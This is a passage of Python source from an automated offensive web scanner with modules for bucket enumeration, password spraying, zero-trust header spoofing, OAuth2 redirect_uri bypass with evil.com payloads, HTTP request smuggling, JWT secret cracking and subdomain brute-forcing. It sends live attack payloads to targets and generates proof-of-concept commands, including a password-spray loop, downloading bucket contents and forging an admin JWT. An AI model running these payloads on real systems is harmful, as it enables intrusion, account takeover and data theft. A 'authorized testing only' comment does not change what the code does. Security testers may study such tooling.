                  "ap-southeast-1", "ap-northeast-1"]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        apex = profile.apex.replace(".", "-")
        host = profile.host.replace(".", "-")
        buckets_to_test = [
            tmpl.format(apex=apex, host=host)
            for tmpl in self.BUCKET_NAMES_TMPL
        ]
        for bucket in buckets_to_test[:12]:
            # Test S3
            for region in self.S3_REGIONS[:3]:
                s3_url = f"https://{bucket}.s3.{region}.amazonaws.com/"
                try:
                    r = _fetch(s3_url, cfg.ua, cfg.timeout)
                    if r and r.status in (200, 403):
                        body = (r.body or b"").decode("utf-8", errors="replace")
                        is_public = r.status == 200 and "<Key>" in body
                        is_exists = r.status in (200, 403)
                        if is_exists:
                            profile.findings.append(Finding(
                                id=f"S3-BUCKET-{bucket.upper()[:18].replace('-','_')}",
                                title=f"S3 Bucket {'Public Listing' if is_public else 'Exists'}: s3://{bucket}",
                                severity="CRITICAL" if is_public else "HIGH",
                                cvss=9.8 if is_public else 6.5,
                                cwe="CWE-284",
                                description=(
                                    f"S3 bucket s3://{bucket} in {region} "
                                    f"{'has public object listing — all data accessible' if is_public else 'exists (access controlled)'}. "
                                    + ("Even 403 buckets can have specific objects readable if ACL misconfigured."
                                       if not is_public else "")
                                ),
                                evidence=f"HTTP {r.status} | Public: {is_public} | Snippet: {body[:200]}",
                                poc_curl=(
                                    f"curl -sk '{s3_url}'\n"
                                    f"aws s3 ls s3://{bucket} --no-sign-request\n"
                                    f"aws s3 sync s3://{bucket} /tmp/{bucket}/ --no-sign-request"
                                ),
                                category="Cloud Storage",
                                remediation="Block S3 Public Access at account level. Audit all bucket policies and ACLs. Enable S3 Access Logging. Use aws:PrincipalOrgID condition in bucket policies."
                            ))
                            break
                except Exception:
                    pass
            # Test GCS
            gcs_url = f"https://storage.googleapis.com/{bucket}/"
            try:
                r = _fetch(gcs_url, cfg.ua, cfg.timeout)
                if r and r.status in (200, 403):
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    if "storage.googleapis.com" in body or "<Key>" in body or "AccessDeniedException" in body:
                        profile.findings.append(Finding(
                            id=f"GCS-BUCKET-{bucket.upper()[:18].replace('-','_')}",
                            title=f"GCS Bucket {'Public' if r.status == 200 else 'Exists'}: gs://{bucket}",
                            severity="CRITICAL" if r.status == 200 else "MEDIUM",
                            cvss=9.8 if r.status == 200 else 5.3,
                            cwe="CWE-284",
                            description=f"GCS bucket gs://{bucket} detected (HTTP {r.status}).",
                            evidence=body[:200],
                            poc_curl=f"curl -sk '{gcs_url}'\ngsutil ls gs://{bucket}/",
                            category="Cloud Storage",
                            remediation="Set allUsers IAM binding to none. Enable uniform bucket-level access. Audit IAM policies. Use VPC Service Controls."
                        ))
            except Exception:
                pass
        return profile


class CredentialStuffingMapper:
    """Map credential stuffing attack surface from discovered auth endpoints."""
    NAME = "Credential Stuffing Mapper"
    AUTH_ENDPOINTS = [
        ("/login",          "POST", {"username": "test@test.com", "password": "test123"}),
        ("/api/login",      "POST", {"email": "test@test.com", "password": "test123"}),
        ("/api/auth",       "POST", {"username": "test", "password": "test123"}),
        ("/api/v1/login",   "POST", {"email": "test@test.com", "password": "test123"}),
        ("/api/v2/auth",    "POST", {"user": "test", "pass": "test123"}),
        ("/api/signin",     "POST", {"email": "test@test.com", "password": "test123"}),
        ("/auth/token",     "POST", {"grant_type": "password", "username": "test", "password": "test123"}),
        ("/api/sessions",   "POST", {"email": "test@test.com", "password": "test123"}),
    ]
    SPRAY_PASSWORDS = [
        "Password1!", "Welcome1!", "Summer2024!", "Winter2024!",
        "Company2024!", "Admin123!", "123456789",
        "P@ssw0rd", "Qwerty123!", "Letmein1!",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for path, method, creds in self.AUTH_ENDPOINTS:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout, method,
                           json.dumps(creds).encode(),
                           {"Content-Type": "application/json"})
                if r:
                    hdrs = str(r.headers)
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    rate_limited = any(s in hdrs.lower() + body.lower() for s in [
                        "x-ratelimit", "rate-limit", "too many", "429",
                        "retry-after", "x-retry", "throttle"
                    ])
                    lockout = any(s in body.lower() for s in [
                        "locked", "lock", "blocked", "captcha",
                        "challenge", "verify", "suspicious",
                    ])
                    if r.status in (200, 400, 401, 403) and not rate_limited:
                        profile.findings.append(Finding(
                            id=f"CREDSTUFF-{path.replace('/','_').strip('_')[:16].upper()}",
                            title=f"Credential Stuffing Surface — No Rate Limit at {path}",
                            severity="HIGH" if not lockout else "MEDIUM",
                            cvss=7.5 if not lockout else 5.3,
                            cwe="CWE-307",
                            description=(
                                f"Auth endpoint {path} has no apparent rate limiting or lockout. "
                                f"Credential stuffing surface: {len(self.SPRAY_PASSWORDS)} common passwords × "
                                "all leaked credential pairs can be tested rapidly."
                            ),
                            evidence=f"HTTP {r.status} | Rate-limited: {rate_limited} | Lockout: {lockout}",
                            poc_curl=(
                                f"# Password spray (authorized testing only):\n"
                                f"for pass in Password1! Welcome1! Summer2024!; do\n"
                                f"  curl -sk -X {method} '{url}' "
                                f"  -H 'Content-Type: application/json' "
                                f"  -d '{{\"email\":\"admin@{profile.apex}\",\"password\":\"$pass\"}}' | "
                                f"  grep -v 'invalid\\|error'; done"
                            ),
                            category="Auth / Credential Stuffing",
                            remediation="Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows."
                        ))
            except Exception:
                pass
        return profile


class TLSAttackSurface:
    """Detect TLS attack surface: BEAST, POODLE, DROWN, SWEET32, certificate issues."""
    NAME = "TLS Attack Surface"
    WEAK_CIPHERS = [
        "RC4", "DES", "3DES", "EXPORT", "NULL", "ANON",
        "MD5", "SHA1withRSA", "PKCS1", "SSLv2", "SSLv3",
    ]
    TLS_PROBES = [
        ("BEAST",    "TLSv1.0", "CBC cipher in TLS 1.0"),
        ("POODLE",   "SSLv3",   "SSLv3 fallback"),
        ("DROWN",    "SSLv2",   "SSLv2 enabled"),
        ("SWEET32",  "3DES",    "64-bit block cipher (3DES/DES)"),
        ("FREAK",    "EXPORT",  "Export-grade cipher suite"),
        ("LOGJAM",   "DHE_EXPORT", "Weak Diffie-Hellman export"),
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import ssl, socket
        host = profile.host
        port = 443
        # Check TLS version and cipher
        for min_ver, label in [
            (ssl.PROTOCOL_TLS_CLIENT, "TLS"),
        ]:
            try:
                ctx = ssl.SSLContext(min_ver)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                ctx.minimum_version = ssl.TLSVersion.SSLv3 if hasattr(ssl.TLSVersion, 'SSLv3') else ssl.TLSVersion.TLSv1
                with socket.create_connection((host, port), timeout=cfg.timeout) as sock:
                    with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                        version = ssock.version()
                        cipher = ssock.cipher()
                        cipher_name = cipher[0] if cipher else ""
                        # Check for weak versions
                        if version in ("SSLv3", "TLSv1", "TLSv1.1"):
                            profile.findings.append(Finding(
                                id=f"TLS-WEAK-VERSION-{version.replace('.','').upper()}",
                                title=f"Weak TLS Version Accepted: {version}",
                                severity="HIGH",
                                cvss=7.4,
                                cwe="CWE-326",
                                description=(
                                    f"Server accepts {version} connections. "
                                    f"Vulnerable to {'POODLE' if 'SSL' in version else 'BEAST/LUCKY13'} attacks. "
                                    "Plaintext extraction of encrypted sessions possible via downgrade attack."
                                ),
                                evidence=f"TLS Version: {version} | Cipher: {cipher_name}",
                                poc_curl=(
                                    f"curl -sk --{'ssl3' if 'SSL' in version else 'tlsv1'} "
                                    f"'https://{host}/' -v 2>&1 | grep 'SSL connection'"
                                ),
                                category="TLS / Crypto",
                                remediation=f"Disable {version}. Enforce TLS 1.2+ minimum. Use TLS 1.3 preferentially. Configure forward secrecy ciphers only."
                            ))
                        # Check for weak ciphers
                        for weak in self.WEAK_CIPHERS:
                            if weak.lower() in cipher_name.lower():
                                profile.findings.append(Finding(
                                    id=f"TLS-WEAK-CIPHER-{weak.upper()[:12]}",
                                    title=f"Weak TLS Cipher Suite: {cipher_name}",
                                    severity="HIGH",
                                    cvss=7.4,
                                    cwe="CWE-327",
                                    description=(
                                        f"Server negotiated weak cipher: {cipher_name}. "
                                        f"Contains {weak} which is cryptographically broken."
                                    ),
                                    evidence=f"Cipher: {cipher_name} | Version: {version}",
                                    poc_curl=(
                                        f"openssl s_client -connect {host}:443 "
                                        f"-cipher '{weak}' 2>&1 | grep 'Cipher is'"
                                    ),
                                    category="TLS / Crypto",
                                    remediation=f"Remove {weak} from cipher suite. Use only AEAD ciphers: AES-GCM, ChaCha20-Poly1305. Apply Mozilla TLS configuration generator (intermediate or modern profile)."
                                ))
                                break
            except Exception:
                pass
        return profile


class PasswordPolicyAnalyzer:
    """Analyze password policy weaknesses: min length, complexity, brute force protection."""
    NAME = "Password Policy Analyzer"
    TEST_PASSWORDS = [
        ("1",          "single char"),
        ("12",         "2 chars"),
        ("abc",        "3 chars no complexity"),
        ("1234",       "4 digits"),
        ("password",   "common word"),
        ("Password",   "capitalized common"),
        ("P@ss",       "4 chars with complexity"),
        ("aaaaaaaa",   "8 identical chars"),
        ("        ",   "8 spaces"),
        ("password123", "11 chars common"),
    ]
    CHANGE_PATHS = [
        "/api/user/password", "/api/password/change",
        "/api/account/password", "/api/auth/password",
        "/user/change-password", "/settings/password",
        "/api/v1/password", "/api/v2/password",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        accepted_weak = []
        for path in self.CHANGE_PATHS[:4]:
            url = base + path
            for pwd, label in self.TEST_PASSWORDS[:6]:
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout, "POST",
                               json.dumps({
                                   "current_password": "OldPass1!",
                                   "new_password": pwd,
                                   "password": pwd,
                                   "password_confirmation": pwd,
                               }).encode(),
                               {"Content-Type": "application/json"})
                    if r and r.status in (200, 201):
                        body = (r.body or b"").decode("utf-8", errors="replace")
                        if any(s in body.lower() for s in [
                            "success", "updated", "changed", "ok", "true"
                        ]):
                            accepted_weak.append((pwd, label, path))
                except Exception:
                    pass
        if accepted_weak:
            profile.findings.append(Finding(
                id="PWD-POLICY-WEAK-001",
                title="Weak Password Policy — Insecure Passwords Accepted",
                severity="HIGH",
                cvss=7.5,
                cwe="CWE-521",
                description=(
                    f"Password policy accepts {len(accepted_weak)} weak password(s): "
                    + ", ".join(f"'{p}' ({l})" for p, l, _ in accepted_weak[:4])
                    + ". Weak policy dramatically reduces brute force resistance."
                ),
                evidence="\n".join(f"  Accepted: '{p}' ({l}) at {path}" for p, l, path in accepted_weak[:6]),
                poc_curl=(
                    f"curl -sk -X POST '{base}{accepted_weak[0][2]}' "
                    f"-H 'Content-Type: application/json' "
                    f"-d '{{\"new_password\": \"{accepted_weak[0][0]}\", \"password\": \"{accepted_weak[0][0]}\"}}'",
                ),
                category="Auth / Password Policy",
                remediation="Enforce minimum 12 characters. Require uppercase + lowercase + digit + symbol. Check against HaveIBeenPwned API. Implement zxcvbn strength estimation. Reject top-10000 common passwords."
            ))
        return profile


class GraphQLSchemaHarvest:
    """Harvest full GraphQL schema, enumerate all types/mutations/subscriptions."""
    NAME = "GraphQL Schema Harvest"
    GQL_ENDPOINTS = ["/graphql", "/api/graphql", "/v1/graphql",
                     "/query", "/gql", "/graphiql", "/api/query"]
    FULL_INTROSPECT = json.dumps({
        "query": """
        {
          __schema {
            queryType { name }
            mutationType { name }
            subscriptionType { name }
            types {
              name kind description
              fields(includeDeprecated: true) {
                name description isDeprecated deprecationReason
                args { name description type { name kind ofType { name kind } } }
                type { name kind ofType { name kind ofType { name kind } } }
              }
              inputFields { name type { name kind } }
              enumValues { name isDeprecated }
            }
            directives { name locations args { name type { name kind } } }
          }
        }"""
    })

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for ep in self.GQL_ENDPOINTS:
            url = base + ep
            try:
                r = _fetch(url, cfg.ua, cfg.timeout + 10, "POST",
                           self.FULL_INTROSPECT.encode(),
                           {"Content-Type": "application/json"})
                if r and r.status == 200:
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    if '"__schema"' in body and '"types"' in body:
                        # Count types
                        type_count = body.count('"name"')
                        mutation_count = body.count('"MUTATION"') + body.count('"mutation"')
                        sensitive = [w for w in [
                            "password", "token", "secret", "admin",
                            "internal", "private", "delete", "createUser",
                            "updateRole", "adminMutation", "debug",
                        ] if w.lower() in body.lower()]
                        profile.findings.append(Finding(
                            id=f"GQL-SCHEMA-HARVEST-{ep.replace('/','_').strip('_')[:14].upper()}",
                            title=f"GraphQL Full Schema Harvested at {ep}",
                            severity="HIGH" if sensitive else "MEDIUM",
                            cvss=7.5 if sensitive else 5.3,
                            cwe="CWE-284",
                            description=(
                                f"Full GraphQL schema introspection at {ep}. "
                                f"~{type_count} type references, ~{mutation_count} mutation hints. "
                                + (f"Sensitive identifiers: {', '.join(sensitive[:6])}. "
                                   if sensitive else "")
                                + "Enables complete attack surface mapping of all queries, mutations, and subscriptions."
                            ),
                            evidence=f"Schema size: {len(body)} bytes | Types: ~{type_count} | Mutations: ~{mutation_count} | Sensitive: {sensitive[:5]}",
                            poc_curl=(
                                f"curl -sk -X POST '{url}' "
                                f"-H 'Content-Type: application/json' "
                                f"-d '{{\"query\":\"{{__schema{{types{{name}}}}}}\"}}'  | python3 -m json.tool"
                            ),
                            category="GraphQL",
                            remediation="Disable introspection in production. Use query allowlisting (persisted queries). Apply field-level authorization. Monitor for deep introspection queries."
                        ))
                        break
            except Exception:
                pass
        return profile


class ZeroTrustBypassDetector:
    """Detect zero-trust architecture bypasses: mTLS bypass, service mesh escape, identity spoofing."""
    NAME = "Zero Trust Bypass Detector"
    ZT_BYPASS_HEADERS = [
        {"X-Forwarded-Client-Cert": "By=spiffe://cluster.local/ns/default/sa/admin;Subject=admin"},
        {"X-SSL-Client-Cert": "-----BEGIN CERTIFICATE-----"},
        {"X-Client-Certificate": "MIIF..."},
        {"X-Auth-Request-User": "admin"},
        {"X-Auth-Request-Email": "admin@internal.local"},
        {"X-Auth-Request-Groups": "admin,cluster-admins"},
        {"X-Service-Name": "internal-service"},
        {"X-Internal": "true"},
        {"X-Authenticated-User": "admin"},
        {"X-Identity": "admin"},
        {"X-Service-Account": "cluster-admin"},
    ]
    ZT_PATHS = [
        "/api/internal", "/internal", "/admin",
        "/api/admin", "/_internal", "/service",
        "/mesh/", "/istio/", "/envoy/",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for path in self.ZT_PATHS:
            url = base + path
            # Get baseline (should be 401/403)
            try:
                r_base = _fetch(url, cfg.ua, cfg.timeout)
                if not r_base or r_base.status not in (401, 403):
                    continue
            except Exception:
                continue
            for hdr_dict in self.ZT_BYPASS_HEADERS:
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout, extra_headers=hdr_dict)
                    if r and r.status in (200, 201):
                        body = (r.body or b"").decode("utf-8", errors="replace")
                        if len(body) > 50:
                            hdr_str = ", ".join(f"{k}: {v[:30]}" for k, v in hdr_dict.items())
                            profile.findings.append(Finding(
                                id=f"ZEROTRUST-BYPASS-{list(hdr_dict.keys())[0].replace('-','_').upper()[:16]}",
                                title=f"Zero-Trust Bypass via Header Injection: {list(hdr_dict.keys())[0]}",
                                severity="CRITICAL",
                                cvss=9.8,
                                cwe="CWE-290",
                                description=(
                                    f"Zero-trust policy at {path} bypassed via header: {hdr_str}. "
                                    "Service mesh or identity proxy trusts client-supplied identity headers — "
                                    "attacker can impersonate any service account or user."
                                ),
                                evidence=f"Bypass: {hdr_str} | HTTP {r.status} | Body: {body[:150]}",
                                poc_curl=f"curl -sk '{url}' -H '{hdr_str}'",
                                category="Zero Trust / Identity",
                                remediation="Strip all X-Auth-*/X-Forwarded-Client-Cert headers at perimeter. Use mTLS certificate validation in service mesh, not HTTP headers. Apply SPIFFE/SPIRE for service identity."
                            ))
                            break
                except Exception:
                    pass
        return profile


class APIVersioningAbuse:
    """Detect API versioning abuse: deprecated endpoints, version downgrade, shadow APIs."""
    NAME = "API Versioning Abuse"
    VERSION_PATTERNS = [
        "/api/v1/", "/api/v2/", "/api/v3/", "/api/v4/",
        "/v1/", "/v2/", "/v3/",
        "/api/beta/", "/api/alpha/", "/api/dev/",
        "/api/internal/", "/api/test/",
        "/api/legacy/", "/api/old/",
        "/api/2023/", "/api/2022/", "/api/2021/",
    ]
    SENSITIVE_ENDPOINTS = [
        "users", "admin", "config", "settings",
        "export", "import", "delete", "reset",
        "token", "auth", "debug", "internal",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for ver_path in self.VERSION_PATTERNS:
            for ep in self.SENSITIVE_ENDPOINTS[:6]:
                url = base + ver_path + ep
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout)
                    if r and r.status in (200, 201):
                        body = (r.body or b"").decode("utf-8", errors="replace")
                        if any(sig in body for sig in [
                            '"id"', '"email"', '"user"', '"admin"',
                            '"token"', '"key"', '"secret"', '"data"',
                            '"items"', '"results"', '"users"',
                        ]):
                            is_old = any(x in ver_path for x in
                                        ["v1", "beta", "alpha", "dev", "legacy", "old", "2021", "2022"])
                            profile.findings.append(Finding(
                                id=f"APIVERSION-{ver_path.replace('/','_').strip('_')[:12].upper()}-{ep.upper()[:8]}",
                                title=f"{'Deprecated/Shadow' if is_old else ''} API Version Accessible: {ver_path}{ep}",
                                severity="HIGH" if is_old else "MEDIUM",
                                cvss=7.5 if is_old else 5.3,
                                cwe="CWE-284",
                                description=(
                                    f"{'Deprecated ' if is_old else ''}API endpoint {ver_path}{ep} "
                                    f"returns data (HTTP {r.status}). "
                                    + ("Deprecated versions often lack security controls present in current API."
                                       if is_old else "Shadow API endpoint discovered.")
                                ),
                                evidence=body[:200],
                                poc_curl=f"curl -sk '{url}'",
                                category="API Versioning",
                                remediation="Decommission all deprecated API versions. Implement API lifecycle management. Apply same security controls to all versions. Use API gateway to route and deprecate versions centrally."
                            ))
                except Exception:
                    pass
        return profile


class BinaryFileAnalyzer:
    """Analyze exposed binary files: APK, IPA, EXE, DLL for hardcoded secrets and endpoints."""
    NAME = "Binary File Analyzer"
    BINARY_PATHS = [
        "/app.apk", "/application.apk", "/download/app.apk",
        "/mobile/app.apk", "/android/app.apk",
        "/app.ipa", "/application.ipa", "/download/app.ipa",
        "/app.exe", "/setup.exe", "/installer.exe",
        "/app.dll", "/library.dll",
        "/download/app", "/release/app",
        "/builds/latest.apk", "/artifacts/app.apk",
        "/public/app.apk",
    ]
    SECRET_STRINGS = [
        b"api_key", b"apikey", b"API_KEY", b"secret",
        b"password", b"passwd", b"token", b"access_key",
        b"private_key", b"aws_access", b"AKIA",
        b"Authorization:", b"Bearer ", b"Basic ",
        b"https://", b"http://", b"jdbc:", b"mongodb://",
        b"AIza", b"sk-", b"ghp_",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for path in self.BINARY_PATHS:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status == 200:
                    ctype = r.headers.get("content-type", "")
                    body = r.body or b""
                    size = len(body)
                    if size > 1000:  # binary file
                        found_secrets = [
                            s.decode(errors="replace")
                            for s in self.SECRET_STRINGS
                            if s in body
                        ]
                        # Extract printable strings
                        import re
                        strings = re.findall(b'[\x20-\x7e]{8,}', body[:50000])
                        urls_found = [
                            s.decode(errors="replace")
                            for s in strings
                            if b"://" in s and b"android" not in s.lower()
                        ][:10]
                        if found_secrets or urls_found:
                            profile.findings.append(Finding(
                                id=f"BINARY-SECRETS-{path.replace('/','_').strip('_')[:16].upper()}",
                                title=f"Binary File with Secrets/Endpoints: {path}",
                                severity="CRITICAL" if found_secrets else "HIGH",
                                cvss=9.8 if found_secrets else 7.5,
                                cwe="CWE-798",
                                description=(
                                    f"Binary file {path} ({size} bytes) accessible. "
                                    + (f"Secret patterns: {', '.join(found_secrets[:5])}. "
                                       if found_secrets else "")
                                    + (f"Embedded URLs: {', '.join(urls_found[:3])}."
                                       if urls_found else "")
                                ),
                                evidence=(
                                    f"Size: {size} bytes | Content-Type: {ctype}\n"
                                    f"Secrets: {found_secrets[:5]}\n"
                                    f"URLs: {urls_found[:5]}"
                                ),
                                poc_curl=(
                                    f"curl -sk -o /tmp/app '{url}'\n"
                                    f"strings /tmp/app | grep -iE 'api_key|secret|token|password|https://'\n"
                                    f"# APK analysis:\n"
                                    f"apktool d /tmp/app.apk && grep -r 'api' /tmp/app/"
                                ),
                                category="Mobile / Binary",
                                remediation="Remove binary files from web-accessible directories. Use certificate pinning. Move all secrets to remote configuration. Obfuscate strings in released binaries. Implement runtime application self-protection (RASP)."
                            ))
            except Exception:
                pass
        return profile

# ══════════════════════════════════════════════════════════════
# TOOLS 341-360 — 20 Black Team Skills (Phase 15)
# ══════════════════════════════════════════════════════════════

class OAuth2TokenHijack:
    """Detect OAuth2 token interception: redirect_uri bypass, fragment leakage, state fixation."""
    NAME = "OAuth2 Token Hijack"
    AUTH_PATHS = ["/oauth/authorize", "/oauth2/authorize", "/auth/authorize",
                  "/connect/authorize", "/v1/oauth/authorize",
                  "/realms/master/protocol/openid-connect/auth",
                  "/oauth2/default/v1/authorize"]
    BYPASS_REDIRECT = [
        "https://evil.com", "https://evil.com%2F@{host}", "https://{host}.evil.com",
        "https://{host}%0d%0aLocation:https://evil.com", "javascript:alert(1)",
        "//evil.com", "https://evil.com?{host}", "https://good.com.evil.com",
        "https://{host}/../evil.com",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import urllib.parse
        base = profile.url.rstrip("/")
        host = profile.host
        for path in self.AUTH_PATHS:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status in (200, 302, 400):
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    if any(s in body for s in ["client_id", "response_type",
                                               "redirect_uri", "scope", "state"]):
                        for redir in self.BYPASS_REDIRECT[:4]:
                            redir_filled = redir.replace("{host}", host)
                            test_url = (f"{url}?response_type=token&client_id=test"
                                        f"&redirect_uri={urllib.parse.quote(redir_filled)}"
                                        f"&scope=openid&state=FIXEDSTATE")
                            try:
                                r2 = _fetch(test_url, cfg.ua, cfg.timeout)
                                loc = r2.headers.get("location", "")
                                if r2 and r2.status in (302, 301) and "evil.com" in loc:
                                    profile.findings.append(Finding(
                                        id=f"OAUTH2-REDIR-{path.replace('/','_').strip('_')[:14].upper()}",
                                        title=f"OAuth2 redirect_uri bypass — token hijack at {path}",
                                        severity="CRITICAL", cvss=9.3, cwe="CWE-601",
                                        description=(
                                            f"OAuth2 redirect_uri validation bypass at {path}. "
                                            f"Malicious redirect '{redir_filled}' accepted — "
                                            "attacker receives access_token/code in URL fragment."
                                        ),
                                        evidence=f"Location: {loc[:200]}",
                                        poc_curl=f"curl -sk -D- '{test_url}'",
                                        category="OAuth2 / OIDC",
                                        remediation="Strict exact-match redirect_uri validation. Reject all wildcard/subdomain/open-redirect URIs. Enforce state parameter CSRF protection. Use PKCE for public clients."
                                    ))
                                    break
                            except Exception:
                                pass
            except Exception:
                pass
        return profile


class HTTPDesyncTeDetector:
    """Detect TE.0 and CL.0 HTTP request smuggling via differential responses."""
    NAME = "HTTP Desync TE/CL Detector"
    DESYNC_PROBES = [
        # TE.0 — backend ignores TE, frontend uses it
        ("TE.0", "POST", {
            "Transfer-Encoding": "chunked",
            "Content-Length":    "6",
        }, b"0\r\n\r\nG"),
        # CL.0 — frontend uses CL, backend ignores it
        ("CL.0", "POST", {
            "Content-Length":    "0",
        }, b"GET /hopefully404 HTTP/1.1\r\nHost: x\r\n\r\n"),
        # TE obfuscation
        ("TE-OBF", "POST", {
            "Transfer-Encoding": "chunked",
            "Transfer-encoding": "identity",
            "Content-Length":    "6",
        }, b"0\r\n\r\nG"),
        # H2.TE hint via upgrade header
        ("H2-UPGRADE", "GET", {
            "Upgrade":    "h2c",
            "Connection": "Upgrade, HTTP2-Settings",
            "HTTP2-Settings": "AAMAAABkAAQAAP__",
        }, None),
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for label, method, hdrs, body in self.DESYNC_PROBES:
            try:
                t0 = time.time()
                r = _fetch(base + "/", cfg.ua, cfg.timeout + 5,
                           method=method, data=body, extra_headers=hdrs)
                elapsed = time.time() - t0
                if r and (elapsed > 4.5 or r.status in (400, 500, 501)):
                    body_resp = (r.body or b"").decode("utf-8", errors="replace")
                    likely = elapsed > 4.5 or "invalid" in body_resp.lower()
                    if likely:
                        profile.findings.append(Finding(
                            id=f"DESYNC-{label}-001",
                            title=f"HTTP Request Smuggling Surface — {label} probe",
                            severity="HIGH", cvss=8.1, cwe="CWE-444",
                            description=(
                                f"Desync probe {label} returned HTTP {r.status} in {elapsed:.1f}s. "
                                "Indicates possible CL/TE disagreement between frontend proxy "
                                "and backend — enables request smuggling, session hijacking, "
                                "cache poisoning, and WAF bypass."
                            ),
                            evidence=f"HTTP {r.status} | elapsed={elapsed:.2f}s | body={body_resp[:150]}",
                            poc_curl=(
                                f"# {label} smuggling probe:\n"
                                f"curl -sk -X POST '{base}/' "
                                + " ".join(f"-H '{k}: {v}'" for k, v in hdrs.items())
                                + (f" -d $'{''.join(repr(c)[1:-1] for c in body.decode('latin1', errors='replace')[:20])}'" if body else "")
                            ),
                            category="HTTP Smuggling",
                            remediation="Normalize CL and TE headers at the reverse proxy. Reject ambiguous requests. Use HTTP/2 end-to-end. Disable Transfer-Encoding for HTTP/1.1 backends."
                        ))
            except Exception:
                pass
        return profile


class JWTSecretCracker:
    """Brute-force weak JWT HMAC secrets using common wordlists."""
    NAME = "JWT Secret Cracker"
    WEAK_SECRETS = [
        "secret", "password", "123456", "admin", "test", "key",
        "jwt_secret", "your-256-bit-secret", "change-me", "supersecret",
        "token_secret", "app_secret", "flask_secret", "django-insecure",
        "development", "staging", "production", "mysecretkey",
        "HS256key", "jwt-key", "auth_secret", "api_secret",
        "", "null", "undefined", "none", "true", "false",
        profile_host := None,  # placeholder — filled at runtime
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import base64, hmac, hashlib
        secrets_to_try = [s for s in self.WEAK_SECRETS if s is not None]
        secrets_to_try += [profile.host, profile.apex, profile.host.split(".")[0]]
        jwts = [f.evidence for f in profile.findings if "JWT" in f.id or "jwt" in f.id.lower()]
        jwts += [s.get("value", "") for s in profile.secrets if "eyJ" in s.get("value", "")]
        for raw_jwt in jwts[:5]:
            raw_jwt = raw_jwt.strip().strip('"\'')
            parts = raw_jwt.split(".")
            if len(parts) != 3:
                continue
            header_payload = f"{parts[0]}.{parts[1]}"
            sig_b64 = parts[2]
            for secret in secrets_to_try:
                try:
                    sig = hmac.new(secret.encode(), header_payload.encode(), hashlib.sha256).digest()
                    sig_b64_check = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
                    if sig_b64_check == sig_b64:
                        profile.findings.append(Finding(
                            id=f"JWT-CRACK-WEAK-SECRET",
                            title=f"JWT HMAC Secret Cracked: '{secret}'",
                            severity="CRITICAL", cvss=9.8, cwe="CWE-326",
                            description=(
                                f"JWT HMAC-SHA256 secret is weak: '{secret}'. "
                                "Attacker can forge any token — impersonate any user, "
                                "escalate to admin, bypass all JWT-protected endpoints."
                            ),
                            evidence=f"JWT: {raw_jwt[:60]}... | Secret: {secret}",
                            poc_curl=(
                                f"# Forge admin JWT with python-jwt or jwt.io:\n"
                                f"python3 -c \""
                                f"import jwt; print(jwt.encode({{'sub':'admin','role':'admin'}}, '{secret}', algorithm='HS256'))"
                                f"\""
                            ),
                            category="JWT",
                            remediation=f"Replace weak secret '{secret}' with ≥256-bit cryptographically random value. Use RS256 (asymmetric) for JWTs. Rotate all tokens immediately."
                        ))
                        break
                except Exception:
                    pass
        return profile


class ReconSubdomainBrute:
    """Brute-force subdomains via raw DNS UDP against common wordlist."""
    NAME = "Subdomain Brute DNS"
    WORDLIST = [
        "api", "app", "admin", "dev", "stage", "staging", "test", "beta",
        "prod", "production", "secure", "vpn", "mail", "smtp", "ftp",
        "ssh", "git", "gitlab", "jenkins", "ci", "cd", "jira", "confluence",
        "wiki", "docs", "support", "help", "portal", "dashboard", "panel",
        "monitor", "metrics", "grafana", "kibana", "elastic", "redis",
        "db", "database", "mysql", "postgres", "mongo", "rabbit", "kafka",
        "auth", "login", "oauth", "sso", "iam", "idp", "accounts",
        "mobile", "api2", "v1", "v2", "v3", "internal", "private",
        "corporate", "intranet", "remote", "cloud", "aws", "azure",
        "backup", "archive", "old", "new", "legacy", "preview",
        "sandbox", "uat", "qa", "static", "assets", "cdn", "media",
        "img", "images", "files", "upload", "uploads", "download",
    ]

    def _dns_lookup(self, hostname: str) -> str:
        import socket
        try:
            return socket.gethostbyname(hostname)
        except Exception:
            return ""

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        apex = profile.apex
        new_subs = []
        for word in self.WORDLIST:
            fqdn = f"{word}.{apex}"
            if fqdn in profile.subdomains:
                continue
            ip = self._dns_lookup(fqdn)
            if ip:
                new_subs.append((fqdn, ip))
                profile.subdomains.append(fqdn)
        if new_subs:
            profile.findings.append(Finding(
                id="RECON-SUBDOMAIN-BRUTE-001",
                title=f"Subdomain Brute — {len(new_subs)} new subdomains discovered",
                severity="INFO", cvss=0.0, cwe="CWE-200",
                description=(
